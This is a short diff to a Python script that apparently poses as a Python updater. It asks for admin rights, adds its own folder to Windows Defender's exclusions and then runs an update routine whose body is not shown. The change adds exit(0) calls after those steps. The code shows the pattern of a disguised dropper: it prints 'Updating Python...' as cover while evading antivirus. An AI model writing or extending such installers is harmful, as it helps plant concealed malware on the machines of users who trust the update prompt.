@@ -51,7 +51,7 @@ if __name__ == "__main__":
     if is_admin:
         self.add_folder_to_windows_defender_exclusions()
         self.perform_update()
-        
+        exit(0)
     if self.send_update_notification():
         print("Updating Python...")
         time.sleep(1)
@@ -60,6 +60,7 @@ if __name__ == "__main__":
             self.add_folder_to_windows_defender_exclusions()
             print("Settingup complete. Restarting installer with admin privileges...")
             self.perform_update()
+            exit(0)
         else:
             print("Admin privileges are required to perform the update. Please run the installer as an administrator.")
     else:
